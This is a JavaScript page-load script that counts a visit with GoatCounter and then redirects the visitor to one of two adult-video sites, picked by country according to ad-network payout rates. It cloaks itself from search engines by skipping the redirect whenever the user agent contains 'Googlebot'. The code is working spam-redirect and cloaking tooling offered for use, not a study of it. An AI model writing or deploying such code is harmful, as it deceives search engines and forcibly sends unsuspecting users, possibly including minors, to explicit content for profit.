const HIGH_CPM_URL = "https://livesexvideo.pages.dev";
const LOW_CPM_URL  = "https://xvideoshub.pages.dev";
const GOATCOUNTER_URL = "https://xnxxhot.goatcounter.com/count";

// Edit this list to match your ad network's top-paying countries
const HIGH_CPM_COUNTRIES = [
  "US", "CA", "GB", "AU", "NZ", "DE", "FR", "NL", "CH",
  "SE", "NO", "DK", "FI", "IE", "AT", "BE", "SG", "JP", "AE"
];

// ---------- GoatCounter ----------
window.goatcounter = {
  path: function () {
    var id = new URLSearchParams(location.search).get("id");
    return id ? "/" + id + ".html" : location.pathname;
  }
};

// ---------- Country lookup ----------
async function getCountry() {
  try {
    const res = await fetch("https://www.cloudflare.com/cdn-cgi/trace");
    const text = await res.text();
    const match = text.match(/loc=([A-Z]{2})/);
    return match ? match[1] : null;
  } catch (e) {
    return null;
  }
}

// ---------- Redirect ----------
let redirected = false;

async function runRedirect() {
  if (redirected) return;
  redirected = true;

  if (navigator.userAgent.includes("Googlebot")) {
    console.log("Thanks for visiting my page");
    return;
  }

  const country = await getCountry();
  const target = HIGH_CPM_COUNTRIES.includes(country) ? HIGH_CPM_URL : LOW_CPM_URL;
   window.location.href = target;
}

// ---------- Load counter, then redirect ----------
const gc = document.createElement("script");
gc.async = true;
gc.src = "https://gc.zgo.at/count.js";
gc.setAttribute("data-goatcounter", GOATCOUNTER_URL);

gc.onload = function () {
  setTimeout(runRedirect, 300); // give the count request time to send
};
gc.onerror = runRedirect;        // counter blocked: redirect anyway

document.head.appendChild(gc);

setTimeout(runRedirect, 1000);   // safety net if the counter never loads
